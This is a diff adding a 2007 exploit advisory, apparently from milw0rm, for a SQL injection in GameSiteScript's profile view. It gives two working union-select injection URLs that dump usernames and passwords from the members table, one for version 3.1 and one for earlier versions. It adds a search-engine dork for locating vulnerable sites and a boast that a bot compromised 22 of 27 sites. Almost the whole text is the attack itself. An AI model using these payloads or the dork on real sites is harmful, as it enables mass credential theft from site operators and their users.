@@ -1,0 +1,30 @@
+###############################################
+####### GameSiteScript (Profile)($id) SQL-Injection Exploit
+###############################################
+### Vulnerability Discovered By: Xenduer77
+### ---July 7th, 2007
+###############################################
+
+{$id} Is passed straight to the query without being filtered.
+
+###############################################
+SQL-INJECTION:
+###############################################
+
+For Version 3.1:
+-------
+http://whatever.com/iindex.php?params=profile/view/'+union+select+0,username,0,0,0,0,0,0,0,0,0,0,0,0,password,0,0,0,0,0,0,0,0+from+members+where+id='1
+
+Prior To 3.1:
+-------
+http://whatever.com/index.php?params=profile/view/'+union+select+0,username,0,0,0,0,0,0,0,0,0,0,0,0,password,0,0,0,0,0,0+from+members+where+id='1
+
+###Tested by a bot on 27 sites, 22 were exploited.
+
+###############################################
+
+Dork: "Powered by GameSiteScript"
+
+###############################################
+
+# milw0rm.com [2007-07-07]
